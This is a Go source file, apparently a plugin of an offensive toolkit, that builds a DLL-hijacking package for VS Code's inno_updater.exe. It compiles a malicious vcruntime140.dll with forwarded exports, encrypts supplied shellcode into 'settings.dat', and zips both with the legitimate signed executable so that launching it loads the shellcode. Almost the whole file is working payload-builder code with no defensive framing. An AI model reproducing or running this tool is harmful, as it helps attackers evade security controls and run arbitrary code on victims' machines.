package plugins

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
	"toolset/utils"
)

type DllHijackOptionItem struct {
	Type int `json:"type"`
	Name string `json:"name"`
	Runner RunnerIface `json:"-"` 
}

func DllHijackConfig() ([]DllHijackOptionItem) {
	return []DllHijackOptionItem{
		{
			Type: 1,
			Name: "(x86) vscode",
			Runner: new(DllHijackVscode),
		},
	}
}

type DllHijackVscode struct {
	BasePlugin
	shellcode []byte
}

func (p *DllHijackVscode) Init() {
	p.BasePlugin.PluginName = "dll_hijack_vscode"
}

func (p *DllHijackVscode) SetShellcdoe(shellcode []byte) {
	p.shellcode = shellcode
}

func (p *DllHijackVscode) updateDefFile(defFilePath string, exports []string, dllName string) (err error) {
	t, err := template.ParseFiles(defFilePath)
	if err != nil {
		return err
	}
	f, err := os.OpenFile(defFilePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return err
	}
	defer f.Close()
	data := map[string]interface{} {
		"DllName": dllName,
		"Exports": exports,
	}
	err = t.Execute(f, data)
	return
}

func (p *DllHijackVscode) getExports() []string {
	return []string{
		"_except_handler4_common",
		"memset",
		"memmove",
		"memcmp",
		"memcpy",
		"__std_type_info_destroy_list",
	}
}

func (p *DllHijackVscode) buildEvilDll(workDir string, x64 bool, expPath string) ([]byte, error) {
	env := os.Environ()
	env = append(env, "GOOS=windows")
	env = append(env, "CGO_ENABLED=1")
	if x64 {
		env = append(env, "GOARCH=amd64")
		env = append(env, "CC=x86_64-w64-mingw32-gcc")
	} else {
		env = append(env, "GOARCH=386")
		env = append(env, "CC=i686-w64-mingw32-gcc")
	}
	// 初始化 mod
	cmd := exec.Command("go", "mod", "init", "output")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err := cmd.Run()
	if err != nil {
		return nil, err
	}
	// 生成dll
	outputDll := filepath.Join(workDir, "output.dll")
	ldflags := fmt.Sprintf("-extldflags=-Wl,%s -s -w", expPath)
	cmd = exec.Command("go", "build", "-trimpath", "-o", outputDll, "-buildmode", "c-shared", "-ldflags", ldflags)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err = cmd.Run()
	if err != nil {
		return nil, err
	}
	return ioutil.ReadFile(outputDll)
}

func (p *DllHijackVscode) Run() ([]byte, error) {
	// 新建一个临时目录作为工作目录，并把所有的所需的基础文件拷贝过去
	tmpDir, err := p.buildTmpWorkDir()
	if err != nil {
		return nil, err
	}
	// defer os.RemoveAll(tmpDir)
	// 更新def文件
	defPath := filepath.Join(tmpDir, "functions.def")
	err = p.updateDefFile(defPath, p.getExports(), "vcruntime140")
	if err != nil {
		return nil, err
	}
	// 将def文件转为exp文件
	expPath := filepath.Join(tmpDir, "functions.exp")
	err = p.defToExp(false, defPath, expPath)
	if err != nil {
		return nil, err
	}
	// 进行转发dll编译
	evilDllData, err := p.buildEvilDll(tmpDir, false, expPath)
	if err != nil {
		return nil, err
	}
	// 生成加密处理后的 shellcode
	shellcodeData := utils.CustomEncryptData(p.shellcode)
	// 读取白程序exe内容
	whiteExeData, err := ioutil.ReadFile(filepath.Join(tmpDir, "inno_updater.exe"))
	if err != nil {
		return nil, err
	}
	// 打包zip
	files := []utils.FileData{
		{
			Name: "settings.dat",
			Body: shellcodeData,
		},
		{
			Name: "vcruntime140.dll",
			Body: evilDllData,
		},
		{
			Name: "inno_updater.exe",
			Body: whiteExeData,
		},
	}
	zipPath, err := utils.ZipData(files)
	if err != nil {
		return nil, err
	}
	defer os.Remove(zipPath)
	return ioutil.ReadFile(zipPath)
}